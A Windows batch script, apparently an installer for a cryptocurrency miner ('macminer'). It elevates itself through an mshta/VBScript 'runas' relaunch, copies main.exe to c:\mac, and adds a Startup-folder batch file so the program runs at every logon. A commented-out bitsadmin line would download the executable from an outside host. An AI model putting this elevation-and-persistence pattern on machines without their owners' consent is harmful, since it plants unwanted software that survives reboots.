@echo on
if exist "%SystemRoot%\SysWOW64" path %path%;%windir%\SysNative;%SystemRoot%\SysWOW64;%~dp0
bcdedit >nul
if '%errorlevel%' NEQ '0' (goto UACPrompt) else (goto UACAdmin)
:UACPrompt
%1 start "" mshta vbscript:createobject("shell.application").shellexecute("""%~0""","::",,"runas",1)(window.close)&exit
exit /B
:UACAdmin
cd /d "%~dp0"

echo Now PATH is %CD%
echo Get Shell Power

set GenFolder=c:\mac
set MACFile=main.exe


md %GenFolder%
md %GenFolder%\config
rem bitsadmin.exe /transfer "JobName" http://thenextmac.com/release/%MACFile% %TEMP%\%MACFile%

copy %MACFile% %GenFolder%
copy config\*.* %GenFolder%\config

echo cd %GenFolder% > "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\macminer.bat"
echo %GenFolder%\%MACFile% >> "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\macminer.bat"

echo tasklist|find /i "%MACFile%" && echo started || start "" "%MACFile%"

pause

tasklist|find /i "%MACFile%" && echo started || start "" "%MACFile%"

